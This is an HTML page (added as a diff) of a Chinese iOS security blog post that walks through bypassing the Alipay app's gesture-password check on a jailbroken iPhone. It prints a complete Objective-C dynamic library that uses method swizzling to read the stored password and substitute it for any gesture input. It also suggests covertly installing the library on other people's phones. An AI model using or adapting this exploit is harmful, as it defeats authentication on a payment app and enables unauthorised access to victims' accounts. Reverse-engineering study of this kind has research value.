@@ -1,0 +1,346 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Hack 实战——支付宝 App 手势密码校验欺骗 - IT Monkey Life</title>
+	<meta name="author" content="Rick">
+
+	
+	<meta name="description" content="14 Hack 实战——支付宝 App 手势密码校验欺骗 在 iOS 安全攻防（十一）：Hack实战——探究支付宝 app 手势密码中，介绍了如何利用 gdb 分析 app ，确定了支付宝 app 的手势密码格式为字符串，9 个点分别对应 123456789。在 iOS 安全攻防（十二）： &hellip;">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/Blog/atom.xml" rel="alternate" title="IT Monkey Life" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+</head>
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">IT Monkey Life</a></h1>
+<nav id="main-nav"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="http://google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:ITMonkeyLife.github.io/">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="sub-nav" class="alignright">
+	<div class="social">
+		
+		
+		
+		
+    
+		
+		
+		
+		
+		
+		<a class="rss" href="/Blog/atom.xml" title="RSS">RSS</a>
+		
+    
+	</div>
+	<form class="search" action="http://google.com/search" method="get">
+		<input class="alignright" type="text" name="q" results="0">
+		<input type="hidden" name="q" value="site:ITMonkeyLife.github.io/">
+	</form>
+</nav>
+
+
+</header>
+	
+		
+	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Hack 实战——支付宝 App 手势密码校验欺骗</h2>
+	<div class="entry-content"><div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">14</span> <span class="title">Hack 实战——支付宝 App 手势密码校验欺骗</span></h1>
+    <p>在 <a href="/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/">iOS 安全攻防（十一）：Hack实战——探究支付宝 app 手势密码</a>中，介绍了如何利用 gdb 分析 app ，确定了支付宝 app 的手势密码格式为字符串，9 个点分别对应 123456789。在 <a href="/blog/2016/08/25/ios7-de-dong-tai-ku-zhu-ru/">iOS 安全攻防（十二）：iOS7 的动态库注入</a>中，介绍了如果利用越狱大神们为我们开辟的 iOS7 动态库注入方法。</p>
+
+<p>本文将继续深入 hack 实战，hook 支付宝手势密码校验操作，欺骗其通过任意手势输入。</p>
+
+<p>那么到现在为止，我们已经掌握了什么信息呢？</p>
+
+<p>1）一个名叫<code> GestureUnlockViewController </code>的类，含有<code> gestureInputView:didFinishWithPassword:  </code>方法，来处理输入的手势</p>
+
+<p>2）正确的手势密码通过一个名叫<code> GestureUtil </code>的类读取，方法是<code> getPassword</code></p>
+
+<p>思路马上清晰了，我们需要做 2 步：</p>
+
+<p>1）hook <code>getPassword </code>存下正确的密码</p>
+
+<p>2）hook <code>gestureInputView:didFinishWithPassword: </code> 替换当前输入为正确的密码</p>
+
+<p>一个关键点，我们是用<code> Method Swizzling </code>来 hook，那么就意味操作不能过早，因为我们要保证在取到  <code>GestureUnlockViewController </code>和<code> GestureUtil class </code>后，才能进行 imp 替换。</p>
+
+<p>所以， 我采用<code> NSNotificationCenter </code>通知机制协助完成任务。</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+<span class="line-number">56</span>
+<span class="line-number">57</span>
+<span class="line-number">58</span>
+<span class="line-number">59</span>
+<span class="line-number">60</span>
+<span class="line-number">61</span>
+<span class="line-number">62</span>
+<span class="line-number">63</span>
+<span class="line-number">64</span>
+<span class="line-number">65</span>
+<span class="line-number">66</span>
+<span class="line-number">67</span>
+<span class="line-number">68</span>
+<span class="line-number">69</span>
+<span class="line-number">70</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;objc/runtime.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">import</span> <span class="o">&lt;</span><span class="n">UIKit</span><span class="o">/</span><span class="n">UIKit</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">IMP</span> <span class="n">ori_getPasswd_IMP</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class="line"><span class="n">IMP</span> <span class="n">ori_gesture_IMP</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@interface</span> <span class="nc">NSObject</span> <span class="nl">(HackPortal)</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@implementation</span> <span class="nc">NSObject</span> <span class="nl">(HackPortal)</span>
+</span><span class="line">
+</span><span class="line"><span class="k">+</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">getPassword</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">NSString</span> <span class="o">*</span><span class="n">passwd</span> <span class="o">=</span> <span class="n">ori_getPasswd_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="k">return</span> <span class="n">passwd</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">gestureInputView:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">view</span> <span class="nf">didFinishWithPassword:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">password</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">password</span> <span class="o">=</span> <span class="n">ori_getPasswd_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_gesture_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">),</span> <span class="n">view</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@implementation</span> <span class="nc">PortalListener</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">init</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">self</span> <span class="o">=</span> <span class="p">[</span><span class="n">super</span> <span class="n">init</span><span class="p">];</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="p">[[</span><span class="n">NSNotificationCenter</span> <span class="n">defaultCenter</span><span class="p">]</span><span class="nl">addObserver:</span><span class="n">self</span>
+</span><span class="line">                                                <span class="nl">selector:</span><span class="k">@selector</span><span class="p">(</span><span class="nl">appLaunched:</span><span class="p">)</span>
+</span><span class="line">                                                    <span class="nl">name:</span><span class="n">UIApplicationDidBecomeActiveNotification</span>
+</span><span class="line">                                                  <span class="nl">object:</span><span class="nb">nil</span><span class="p">];</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">return</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">appLaunched:</span><span class="p">(</span><span class="n">NSNotification</span> <span class="o">*</span><span class="p">)</span><span class="nv">notification</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_GestureUtil</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;GestureUtil&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_PortalListener</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;PortalListener&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">ori_Method</span> <span class="o">=</span> <span class="n">class_getClassMethod</span><span class="p">(</span><span class="n">class_GestureUtil</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_getPasswd_IMP</span> <span class="o">=</span> <span class="n">method_getImplementation</span><span class="p">(</span><span class="n">ori_Method</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">my_Method</span> <span class="o">=</span> <span class="n">class_getClassMethod</span><span class="p">(</span><span class="n">class_PortalListener</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">ori_Method</span><span class="p">,</span> <span class="n">my_Method</span><span class="p">);</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_Gesture</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;GestureUnlockViewController&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">ori_Method1</span> <span class="o">=</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class_Gesture</span><span class="p">,</span>
+</span><span class="line">                                                 <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_gesture_IMP</span> <span class="o">=</span> <span class="n">method_getImplementation</span><span class="p">(</span><span class="n">ori_Method1</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">my_Method1</span> <span class="o">=</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class_PortalListener</span><span class="p">,</span>
+</span><span class="line">                                                <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">));</span>
+</span><span class="line">    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">ori_Method1</span><span class="p">,</span> <span class="n">my_Method1</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">dealloc</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="p">[[</span><span class="n">NSNotificationCenter</span> <span class="n">defaultCenter</span><span class="p">]</span><span class="nl">removeObserver:</span><span class="n">self</span><span class="p">];</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="k">static</span> <span class="n">PortalListener</span> <span class="o">*</span><span class="n">entrance</span><span class="p">;</span>
+</span><span class="line">    <span class="n">entrance</span> <span class="o">=</span> <span class="p">[[</span><span class="n">PortalListener</span> <span class="n">alloc</span><span class="p">]</span><span class="n">init</span><span class="p">];</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>OK！编译好动态库，塞进 iPhone 试试效果吧～</p>
+
+<p>不管我们输入什么手势，都会被替换为正确的密码去给<code>     gestureInputView:didFinishWithPassword: </code>验证，然后顺利解锁。</p>
+
+<p>这意味着什么呢？</p>
+
+<p>意味着，我们可以通过正规的渠道让用户下载这个动态库，然后悄悄放进越狱的 iPhone 的 <code>/Library/MobileSubstrate/DynamicLibraries/</code> 目录下……然后……然后去给妹纸帅锅变魔术吧：“你看，我和你多心有灵犀，你改什么密码我都猜的到!”</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/">http://ITMonkeyLife.github.io/</a></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+		
+		
+		
+		<a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+		
+		
+	</div>
+	
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2016
+
+    Rick
+
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'ITMonkeyLife';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://ITMonkeyLife.github.io//blog/2016/08/25/hack-shi-zhan-zhi-fu-bao-app-shou-shi-mi-ma-xiao-yan-qi-pian/';
+        var disqus_url = 'http://ITMonkeyLife.github.io//blog/2016/08/25/hack-shi-zhan-zhi-fu-bao-app-shou-shi-mi-ma-xiao-yan-qi-pian/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//go.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-52658428-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+</body>
+</html>
